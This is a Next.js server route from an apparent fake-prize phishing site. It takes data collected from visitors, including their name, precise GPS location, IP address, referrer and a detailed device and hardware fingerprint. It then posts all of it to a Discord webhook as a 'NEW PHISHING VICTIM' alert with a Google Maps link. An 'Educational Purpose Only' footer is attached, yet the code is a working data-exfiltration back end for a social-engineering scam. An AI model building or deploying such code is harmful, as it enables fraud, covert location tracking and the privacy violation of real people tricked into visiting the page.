// File: src/app/api/send-to-discord/route.ts
import { NextRequest, NextResponse } from 'next/server';

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

export async function POST(request: NextRequest) {
  if (!DISCORD_WEBHOOK_URL) {
    return NextResponse.json(
      { error: 'Discord webhook URL not configured' },
      { status: 500 }
    );
  }

  try {
    const data = await request.json();
    
    // Create Discord embed
    const embed = {
      title: "🎯 PHISHING DEMO - Target Hooked!",
      description: `**${data.userName || 'Anonymous'}** fell for the fake $1,000 prize scam`,
      color: 0xff0000, // Red color
      timestamp: new Date().toISOString(),
      fields: [
        {
          name: "🎭 Social Engineering Success",
          value: `**Name Given:** ${data.userName || 'Not provided'}\n**Fell for:** Fake $1,000 prize\n**Time to Hook:** ~2-3 minutes`,
          inline: false
        },
        {
          name: "📍 Location Data",
          value: data.latitude ? 
            `**Lat:** ${data.latitude.toFixed(6)}\n**Lng:** ${data.longitude.toFixed(6)}\n**Accuracy:** ±${data.accuracy.toFixed(0)}m\n[View on Google Maps](https://www.google.com/maps?q=${data.latitude},${data.longitude})` :
            `**Status:** Location access denied\n**Note:** Target was security-conscious`,
          inline: true
        },
        {
          name: "🌐 Network Info",
          value: `**IP:** ${data.ip || 'Fetching...'}\n**Referrer:** ${data.referrer}\n**Language:** ${data.language}`,
          inline: true
        },
        {
          name: "📱 Device Fingerprint",
          value: `**Device:** ${data.deviceInfo?.deviceName || 'Unknown'}\n**Type:** ${data.deviceInfo?.deviceType}\n**OS:** ${data.deviceInfo?.operatingSystem}\n**Browser:** ${data.deviceInfo?.browser} ${data.deviceInfo?.browserVersion}`,
          inline: true
        },
        {
          name: "🔧 Hardware Details",
          value: `**Screen:** ${data.deviceInfo?.screenDetails.resolution}\n**Pixel Ratio:** ${data.deviceInfo?.screenDetails.pixelRatio}x\n**CPU Cores:** ${data.deviceInfo?.hardwareDetails.cores}\n**RAM:** ${data.deviceInfo?.hardwareDetails.memory}\n**Touch:** ${data.deviceInfo?.hardwareDetails.touchSupport ? 'Yes' : 'No'}`,
          inline: true
        },
        {
          name: "🔍 Technical Details",
          value: `\`\`\`${data.userAgent}\`\`\``,
          inline: false
        }
      ],
      footer: {
        text: "Phishing Awareness Demo | Educational Purpose Only",
        icon_url: "https://cdn.discordapp.com/emojis/848177728799014932.png"
      },
      thumbnail: {
        url: "https://cdn.discordapp.com/emojis/848177589758967838.png"
      }
    };

    const discordPayload = {
      content: "🚨 **NEW PHISHING VICTIM** 🚨\n*Another person learned the hard way how easy it is to fall for scams...*",
      embeds: [embed]
    };

    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(discordPayload),
    });

    if (!response.ok) {
      throw new Error(`Discord API error: ${response.status}`);
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('Error sending to Discord:', error);
    return NextResponse.json(
      { error: 'Failed to send data to Discord' },
      { status: 500 }
    );
  }
}